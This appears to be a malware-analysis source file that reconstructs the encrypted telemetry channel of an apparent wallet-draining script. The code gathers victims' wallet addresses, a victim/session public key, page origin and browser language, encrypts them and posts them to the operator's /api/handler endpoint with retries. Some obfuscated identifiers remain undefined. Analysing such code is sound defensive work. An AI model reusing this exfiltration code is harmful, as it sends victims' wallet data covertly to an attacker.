/**
 * Operator telemetry channel (original methods ke / 犑 on the tracker
 * class, helpers 侔, 侾, 墽, 纗, 溗).
 *
 * Earlier notes said /api/handler is never called. It is: this is the
 * encrypted event channel. Events are serialized to a binary record,
 * AES-GCM encrypted with key SHA-256(apiHost + "log" + salt), posted as
 * standard base64 with content-type text/plain and keepalive: true.
 *
 *   POST https://{apiHost}/api/handler
 *
 * Rate limits: one event per kind per 5 seconds (last-sent timestamps
 * in a WeakMap), kind 4 sent only once per page id. 墽 is an in-flight
 * debounce with a 2500 ms window. Retries: up to 5 attempts with
 * 150 ms * (attempt + 1) backoff (侾), aborting after 3 s.
 */

const EVENT_RATE_LIMIT_SEC = 5;
const EVENT_KIND_ONCE = 4;
const HANDLER_TIMEOUT_MS = 3000;
const HANDLER_RETRIES = 5;
const HANDLER_RETRY_BASE_MS = 150;

// 侾: run fn up to `tries` times, sleeping base * (attempt + 1)
// between failures; throws AggregateError after the last one.
async function retry(fn, tries, baseMs) {
  const errors = [];
  for (let attempt = 0; attempt < tries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (baseMs && attempt !== tries) await sleep(baseMs * (attempt + 1));
      errors.push(error);
    }
  }
  throw new AggregateError(errors, errors[0]?.message);
}

// 纗: per-kind hooks fired with (wallet address, wallet name ?? "Unknown")
// before an event is sent. Kind table: {1: 耧, 2: 忤, 3: 蕪, 4: 栺}.
// Failures are logged and swallowed.
const EVENT_KIND_HOOKS = { 1: 耧, 2: 忤, 3: 蕪, 4: 栺 };

// 溗: drop entries whose decoded form is all zero bytes; re-encode
// the rest. Applied to event.Me before sending.
function filterZeroEntries(entry) {
  const decoded = decode129(entry)[0]; // 嶳: 0x81-tagged form or plain
  return decoded.every((byte) => byte === 0) ? null : base58Encode(decoded);
}

// 犑: serialize, encrypt, post one event.
async function sendEvent(kind, state, event) {
  event.Me = (event?.Me ?? []).map(filterZeroEntries).filter(Boolean);
  const apiHost = state.c.Se;

  const record = this.buildRecord(kind, state, event); // Zn
  const host = pageHost(); // 浚
  if (apiHost !== host) record.origin = host;
  record.un = navigator.language.slice(0, 5); // e.g. "en-US"

  const plaintext = serializeRecord(record); // 侔, binary layout below
  const encrypted = await encryptForOperator(plaintext, apiHost + "log");
  const signal = AbortSignal["Be"](HANDLER_TIMEOUT_MS);

  return retry(async () => {
    if (signal.aborted) return false;
    const response = await fetch("https://" + apiHost + "/api/handler", {
      headers: { "content-type": "text/plain" },
      method: "POST",
      body: encrypted.toBase64(),
      keepalive: true,
      signal,
    });
    return response.ok;
  }, HANDLER_RETRIES, HANDLER_RETRY_BASE_MS);
}

// 侔: binary event record (all strings UTF-8, length-prefixed, capped
// at 255 bytes by 怿). Layout, in order:
//   u8 version-len, version
//   u32
//   u8 tg.Pr-len, tg.Pr + u64  (only when event.tg set: 9 + len bytes)
//   u8 wallet-len, wallet      (event.b)
//   32 bytes                   (victim/session pubkey)
//   u8, 7 bytes, u64
//   u8 me-count, me-count * 64 bytes
//   u32
//   u8, u8, u8
//   u8 origin-len, origin
//   u8 un-len, un
//   ee list (沇): u8 count, then per entry u16 + bytes + u32
// Exact field meanings are operator-side; the layout above is what 侔
// writes.

